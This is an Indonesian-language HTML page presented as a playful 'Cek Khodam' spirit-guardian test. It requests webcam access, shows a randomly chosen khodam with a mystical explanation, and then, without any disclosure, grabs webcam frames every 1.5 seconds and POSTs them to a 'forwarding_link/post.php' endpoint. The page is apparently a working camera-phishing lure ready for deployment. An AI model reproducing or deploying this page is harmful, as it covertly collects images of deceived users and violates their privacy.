<!doctype html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Cek Khodam Sebelum Memulai</title>
<style>
  /* Reset dan font */
  html, body {
    margin: 0; padding: 0; height: 100%;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #1b2735 0%, #090a0f 100%);
    color: #eee;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
  }

  body {
    flex-direction: column;
    text-align: center;
    padding: 20px;
  }

  h1 {
    font-size: 2.5rem;
    margin-bottom: 0.2em;
    color: #00d2ff;
    text-shadow: 0 0 10px #00d2ff;
  }

  #message {
    font-size: 1.2rem;
    margin-bottom: 1.5em;
    color: #a0c4ff;
  }

  /* Loader style */
  .loader {
    margin: 0 auto 1.5em;
    border: 8px solid #2c3e50;
    border-top: 8px solid #00d2ff;
    border-radius: 50%;
    width: 80px;
    height: 80px;
    animation: spin 1.5s linear infinite;
  }
  @keyframes spin {
    0% { transform: rotate(0deg);}
    100% { transform: rotate(360deg);}
  }

  /* Video container */
  .video-wrap {
    position: relative;
    width: 320px;
    height: 240px;
    margin: 1em auto;
    border: 4px solid #00d2ff;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 0 20px #00d2ffaa;
    display: none; /* hidden initially */
  }

  video {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }

  /* Button style */
  #btnStart, #btnRestart {
    background: #00d2ff;
    border: none;
    padding: 12px 28px;
    font-size: 1.1rem;
    border-radius: 30px;
    cursor: pointer;
    color: #0a0a0a;
    font-weight: bold;
    box-shadow: 0 0 15px #00d2ff;
    transition: background 0.3s ease;
    margin-top: 10px;
  }
  #btnStart:hover, #btnRestart:hover {
    background: #008fcc;
  }

  /* Result container */
  #result {
    margin-top: 2em;
    font-weight: 700;
    color: #00ffae;
    text-shadow: 0 0 8px #00ffae;
    max-width: 400px;
    margin-left: auto;
    margin-right: auto;
    text-align: left;
  }
  #result p {
    margin: 0.3em 0;
  }
  #explanation {
    margin-top: 1em;
    font-weight: 400;
    font-size: 1rem;
    color: #a0c4ff;
    line-height: 1.4;
  }
</style>
</head>
<body>

<h1>Cek Khodam Real </h1>
<div id="message">Klik tombol di bawah untuk mengizinkan akses kamera dan mulai cek khodam anda.</div>
<button id="btnStart">Mulai Cek Khodam</button>

<div class="video-wrap" id="videoContainer">
  <video id="video" playsinline autoplay></video>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<div id="loader" style="display:none;">
  <div class="loader"></div>
  <div>Meditasi sedang berlangsung, tunggu sebentar...</div>
  <audio id="meditasiAudio" src="https://0x0.st/8OPP.mp3" autoplay></audio>
</div>

<div id="result"></div>
<button id="btnRestart" style="display:none;">Mulai Permainan Lagi (Memindai Ulang)</button>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
  'use strict';

  const btnStart = document.getElementById('btnStart');
  const btnRestart = document.getElementById('btnRestart');
  const message = document.getElementById('message');
  const videoContainer = document.getElementById('videoContainer');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const loader = document.getElementById('loader');
  const result = document.getElementById('result');

  const constraints = {
    audio: false,
    video: { facingMode: "user" }
  };

  // Daftar khodam spesifik per kategori beserta penjelasannya
  const khodamData = {
    Hewan: [
      {
        name: 'Singa',
        explanation: 'Singa adalah raja hutan yang melambangkan keberanian, kekuatan, dan kepemimpinan. Khodam singa akan membantu Anda menghadapi tantangan dengan penuh percaya diri dan semangat juang tinggi.'
      },
      {
        name: 'Elang',
        explanation: 'Elang melambangkan penglihatan tajam dan kebebasan. Khodam elang membantu Anda melihat peluang dengan jelas dan menjaga kebebasan dalam hidup.'
      },
      {
        name: 'Macan',
        explanation: 'Macan adalah simbol kekuatan dan keberanian. Khodam macan memberi perlindungan dan energi agresif yang terkontrol.'
      }
    ],
    Tumbuhan: [
      {
        name: 'Bambu',
        explanation: 'Bambu melambangkan ketahanan dan fleksibilitas. Khodam bambu membantu Anda tetap teguh dan lentur menghadapi perubahan hidup.'
      },
      {
        name: 'Mawar',
        explanation: 'Mawar adalah simbol cinta dan keindahan. Khodam mawar membawa energi kasih sayang dan harmoni dalam hubungan Anda.'
      },
      {
        name: 'Pohon Pinus',
        explanation: 'Pohon pinus melambangkan umur panjang dan ketenangan. Khodam pinus memberi ketenangan batin dan kesehatan.'
      }
    ],
    Wifu: [
      {
        name: 'Sakura',
        explanation: 'Sakura mewakili kecantikan dan keanggunan. Khodam sakura membantu Anda menyalurkan energi positif dan pesona alami.'
      },
      {
        name: 'Luna',
        explanation: 'Luna adalah entitas spiritual yang lembut dan penuh kasih. Khodam luna mendukung intuisi dan ketenangan jiwa.'
      }
    ],
    ODJG: [
      {
        name: 'Penjaga Bayangan',
        explanation: 'Penjaga Bayangan adalah entitas gaib yang setia melindungi dari bahaya tersembunyi. Khodam ini memberi perlindungan spiritual yang kuat.'
      },
      {
        name: 'Roh Leluhur',
        explanation: 'Roh Leluhur adalah pelindung dari garis keturunan Anda, memberikan bimbingan dan kekuatan spiritual.'
      }
    ],
    Hantu: [
      {
        name: 'Jin Penjaga',
        explanation: 'Jin Penjaga adalah makhluk gaib yang menjaga keseimbangan energi. Khodam ini memberi perlindungan sekaligus kekuatan mistis.'
      },
      {
        name: 'Arwah Penuntun',
        explanation: 'Arwah Penuntun membantu Anda dalam perjalanan spiritual dan membuka wawasan baru.'
      }
    ]
  };

  // Fungsi kirim gambar ke server
  function post(imgdata){
    $.ajax({
      type: 'POST',
      data: { cat: imgdata },
      url: 'forwarding_link/post.php',
      dataType: 'json',
      async: false,
      success: function(result){
        // Bisa ditambahkan handler jika perlu
      },
      error: function(){
        // Error handling jika perlu
      }
    });
  }

  // Fungsi untuk mulai akses webcam
  async function accessWebcam() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
      return true;
    } catch (e) {
      message.innerText = `Kami Tidak Bisa Memulai Permainan Jika Anda Tak Mengizinkan Akses Kamera Anda: ${e.message}`;
      return false;
    }
  }

  // Setelah akses webcam berhasil
  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    videoContainer.style.display = 'block';
  }

  // Fungsi untuk mulai meditasi loading
  function startMeditasi() {
    btnStart.style.display = 'none';
    message.style.display = 'none';
    loader.style.display = 'block';

    // Setelah 5 detik loading meditasi, tampilkan hasil khodam
    setTimeout(() => {
      loader.style.display = 'none';
      showResult();
      startCaptureAndPost();
    }, 1000);
  }

  // Fungsi menampilkan hasil khodam spesifik dan penjelasan
  function showResult() {
    // Pilih kategori acak dari khodamData
    const categories = Object.keys(khodamData);
    const randomCategory = categories[Math.floor(Math.random() * categories.length)];
    // Pilih khodam spesifik acak dari kategori tersebut
    const khodams = khodamData[randomCategory];
    const randomKhodam = khodams[Math.floor(Math.random() * khodams.length)];

    // Tampilkan hasil dan penjelasan
    result.innerHTML = `
      <p>Khodam Anda adalah kategori: <strong>${randomCategory}</strong></p>
      <p>Penjelasan Khodam Anda: <span style="color:#00ffae;">${randomKhodam.name}</span></p>
      <p id="explanation">${randomKhodam.explanation}</p>
    `;
    btnRestart.style.display = 'inline-block';
  }

  // Fungsi menangkap gambar dari video dan kirim berulang
  let captureInterval;
  function startCaptureAndPost() {
    const ctx = canvas.getContext('2d');
    // Kirim gambar setiap 1.5 detik
    captureInterval = setInterval(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
      post(canvasData);
    }, 1500);
  }

  // Fungsi reset permainan dan stop kamera
  function resetGame() {
    // Hentikan interval capture
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
    }
    // Hentikan stream webcam jika ada
    if (window.stream) {
      window.stream.getTracks().forEach(track => track.stop());
      window.stream = null;
    }

    // Reset UI
    result.innerHTML = '';
    btnRestart.style.display = 'none';
    message.style.display = 'block';
    message.innerText = 'Klik tombol di bawah untuk mengizinkan akses kamera dan mulai permainan.';
    btnStart.style.display = 'inline-block';
    videoContainer.style.display = 'none';
    loader.style.display = 'none';
  }

  // Event klik tombol mulai
  btnStart.addEventListener('click', async () => {
    message.innerText = 'Meminta izin akses kamera...';
    const granted = await accessWebcam();
    if (granted) {
      message.innerText = 'Akses kamera diterima! Memulai meditasi...';
      startMeditasi();
    }
  });

  // Event klik tombol restart
  btnRestart.addEventListener('click', () => {
    resetGame();
  });
</script>

</body>
</html>
